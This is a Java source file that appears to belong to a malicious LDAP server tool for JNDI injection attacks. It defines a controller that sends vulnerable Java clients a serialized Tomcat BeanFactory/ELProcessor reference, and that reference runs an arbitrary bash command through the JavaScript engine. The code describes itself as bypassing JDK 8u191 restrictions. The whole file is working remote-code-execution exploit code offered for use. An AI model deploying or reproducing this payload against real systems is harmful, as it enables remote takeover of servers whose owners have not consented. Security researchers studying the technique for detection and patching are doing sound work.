package org.sec.controller;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;
import org.sec.Config;
import org.sec.core.ldap.LdapController;
import org.sec.core.ldap.LdapMapping;
import org.sec.util.EncodeUtil;

import javax.naming.StringRefAddr;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;

@LdapMapping(uri = "/BashTomcat")
@SuppressWarnings("all")
public class BashTomcatController implements LdapController {
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        String cmd = EncodeUtil.getJavaScriptPayload(
                EncodeUtil.getBashPayload(Config.cmd));
        String payload = ("{" +
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                ".newInstance().getEngineByName(\"JavaScript\")" +
                ".eval(\"java.lang.Runtime.getRuntime().exec(${command})\")" +
                "}")
                .replace("${command}", cmd);
        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String");
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", payload));
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(ref);
        e.addAttribute("javaSerializedData", out.toByteArray());
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public String getInfo() {
        return "Use Tomcat ELProcessor Bypass JDK 8u191 (Bash)";
    }
}
